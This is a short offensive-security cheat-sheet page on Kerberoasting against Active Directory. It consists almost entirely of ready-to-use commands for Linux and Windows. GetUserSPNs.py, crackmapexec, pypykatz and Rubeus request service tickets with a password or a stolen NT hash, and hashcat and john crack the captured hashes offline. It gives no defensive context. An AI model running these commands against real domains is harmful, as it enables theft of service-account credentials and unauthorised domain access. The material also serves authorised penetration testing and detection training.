---
description: >-
  When a service account, with a human-defined password, has a SPN set,
  attackers can request a ST for this service and attempt to crack it offline.
  This is Kerberoasting.
---

# Kerberoast

#### Linux

{% code overflow="wrap" %}
```bash
# with a password
GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# with an NT hash
GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'

crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter

pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\username:Password@IP'

# Decrypt the hash
hashcat -m 13100 kerberoastables.txt $wordlist
john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
```
{% endcode %}

#### Windows

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt
hashcat -m 13100 kerberoastables.txt $wordlist
john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
```
